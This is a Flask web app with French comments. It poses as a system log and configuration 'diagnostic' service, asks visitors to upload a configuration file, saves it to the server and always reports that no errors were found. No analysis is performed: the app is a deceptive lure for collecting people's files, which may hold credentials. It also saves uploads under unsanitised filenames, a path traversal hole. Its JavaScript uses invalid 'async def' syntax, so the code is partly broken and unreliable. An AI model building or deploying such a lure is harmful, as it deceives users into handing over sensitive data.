from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
# Limite l'upload à 16 Mo pour ne pas saturer la RAM gratuite
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024 
UPLOAD_FOLDER = '/tmp'

# HTML avec JavaScript (Fetch) pour un envoi en arrière-plan
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Service de Diagnostic</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; }
        #status { margin-top: 20px; color: blue; }
    </style>
</head>
<body>
    <h2>Analyseur de logs système</h2>
    <p>Veuillez sélectionner le fichier de configuration pour analyse :</p>
    
    <input type="file" id="fileInput">
    <button onclick="uploadFile()">Démarrer l'analyse</button>
    
    <div id="status"></div>

    <script>
    async def uploadFile() {
        const fileInput = document.getElementById('fileInput');
        const status = document.getElementById('status');
        
        if (fileInput.files.length === 0) {
            status.innerText = "Veuillez choisir un fichier.";
            return;
        }

        const formData = new FormData();
        formData.append('file', fileInput.files[0]);

        status.innerText = "Analyse en cours... (envoi au serveur)";

        try {
            const response = await fetch('/upload', {
                method: 'POST',
                body: formData
            });
            if (response.ok) {
                status.style.color = "green";
                status.innerText = "Analyse terminée. Aucune erreur détectée.";
            } else {
                status.innerText = "Erreur lors de l'envoi.";
            }
        } catch (err) {
            status.innerText = "Erreur de connexion au serveur.";
        }
    }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files.get('file')
    if file:
        path = os.path.join(UPLOAD_FOLDER, file.filename)
        file.save(path)
        # TIP: Dans les logs Render, tu verras le nom du fichier
        print(f"!!! FICHIER REÇU : {file.filename} !!!")
        return "OK", 200
    return "Erreur", 400
